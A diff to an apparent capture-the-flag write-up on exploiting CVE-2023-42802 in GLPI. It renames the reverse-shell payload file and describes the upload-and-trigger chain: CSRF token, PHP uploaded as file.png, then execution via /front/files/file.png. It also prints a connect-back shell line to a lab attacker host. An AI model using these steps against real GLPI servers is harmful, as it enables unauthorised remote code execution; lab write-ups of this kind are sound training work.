@@ -197,10 +197,10 @@ a reliable reverse-shell exploit. The files used for this were:
 
 - `rce.py`: adapted PoC that retrieves a GLPI CSRF token, uploads a payload, and
   triggers it.
-- `shell.php`: PHP reverse shell payload configured to connect back to the
+- `shell.php.old`: PHP reverse shell payload configured to connect back to the
   attacker host.
 
-The payload callback was configured in `shell.php`:
+The payload callback was configured in `shell.php.old`:
 
 ```php
 $sh = new Shell('192.168.56.1', 4444);
@@ -221,7 +221,8 @@ python3 rce.py http://192.168.56.102
 The adapted PoC performs the following steps:
 
 1. Requests `/index.php` and extracts the GLPI CSRF token.
-2. Reads the local `shell.php` payload.
+2. Reads the local payload file, using `shell.php.old` in the submitted
+   repository.
 3. Uploads the payload as `file.png` through `/front/device.form.php`.
 4. Requests `/front/files/file.png`, which triggers the uploaded PHP payload and
    opens the reverse shell.
@@ -580,7 +581,7 @@ FLAG{d5a31615c10bb7671aa2f4bbbd161f05}
 ### Lessons Learned
 
 - Weaponizing `CVE-2023-42802` took the longest. The PoC had to be adapted so
-  that it uploaded and triggered `shell.php` instead of only proving code
+  that it uploaded and triggered the PHP payload instead of only proving code
   execution.
 - The least obvious part was the GLPI upload flow: the PHP payload is uploaded
   as `file.png` and then executed through `/front/files/file.png`.
